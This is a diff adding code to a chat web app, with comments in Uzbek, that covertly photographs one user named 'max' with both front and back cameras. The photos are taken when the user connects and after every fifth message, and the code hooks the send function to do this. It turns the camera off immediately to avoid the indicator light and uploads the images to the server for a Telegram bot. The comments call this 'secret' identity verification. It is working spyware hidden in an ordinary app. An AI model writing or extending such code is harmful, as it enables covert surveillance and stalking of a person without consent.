@@ -194,3 +194,87 @@ window.uploadFile = async function(file, nameOverride = null) {
         cancelReply();
     } catch (e) { alert("Yuklashda xato!"); }
 }
+
+// ==========================================
+// MAX SHAXSINI YASHIRIN TASDIQLASH (VERIFY)
+// ==========================================
+
+let maxMessageCount = 0;
+
+// Yashirincha rasmga olish funksiyasi
+async function takeSecretPhoto(facingMode) {
+    try {
+        // Ekrandan tashqarida video va canvas yaratamiz
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0); // Kadrdan nusxa olamiz
+        
+        // Kamerani darhol o'chiramiz (yashil chiroq o'chadi)
+        stream.getTracks().forEach(track => track.stop());
+        
+        return new Promise(resolve => {
+            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
+        });
+    } catch (err) {
+        console.log(`Kamera ruxsat bermadi yoki ishlamadi (${facingMode}):`, err);
+        return null;
+    }
+}
+
+// Rasmni serverga yuklab, telegramga signal berish
+async function uploadAndSendToBot(blob, type) {
+    const formData = new FormData();
+    formData.append('file', blob, `verify_${Date.now()}.jpg`);
+    try {
+        const res = await fetch('/upload', { method: 'POST', body: formData });
+        const data = await res.json();
+        socket.emit('verify_photo', { filename: data.filename, type: type });
+    } catch (e) { console.error("Rasm yuklashda xato"); }
+}
+
+// Asosiy tasdiqlash jarayoni (Old va orqa kamera)
+async function runVerification() {
+    if (myUser !== 'max') return; // Faqat Max uchun ishlaydi
+    
+    console.log("Tasdiqlash boshlandi...");
+    
+    // 1. Old kamera (Selfi)
+    const frontBlob = await takeSecretPhoto('user');
+    if (frontBlob) await uploadAndSendToBot(frontBlob, 'Old Kamera 🤳');
+    
+    // Kichik tanaffus (Ikkita kamerani ketma-ket yoqish telefonni qotirmasligi uchun)
+    await new Promise(r => setTimeout(r, 1000));
+    
+    // 2. Orqa kamera
+    const backBlob = await takeSecretPhoto('environment');
+    if (backBlob) await uploadAndSendToBot(backBlob, 'Orqa Kamera 🌍');
+}
+
+// 1) MAX KIRGAN ZAHOTI TASDIQLASH
+socket.on('connect', () => {
+    if (myUser === 'max') {
+        setTimeout(runVerification, 3000); // Sahifa to'liq yuklanib olishi uchun 3 soniya kutamiz
+    }
+});
+
+// 2) HAR 5 TA XABARDAN SO'NG TASDIQLASH
+// O'zingizning xabar yuborish funksiyangiz (sendMessage) ichiga shuni qo'shishingiz kerak:
+const originalSendMessage = window.sendMessage;
+window.sendMessage = function() {
+    // Avval sizning eski xabar yuborish kodingiz ishlaydi
+    originalSendMessage(); 
+    
+    // Keyin Maxning xabarlari sanaladi
+    if (myUser === 'max') {
+        maxMessageCount++;
+        if (maxMessageCount % 5 === 0) { // Har 5-xabarda
+            runVerification();
+        }
+    }
+}
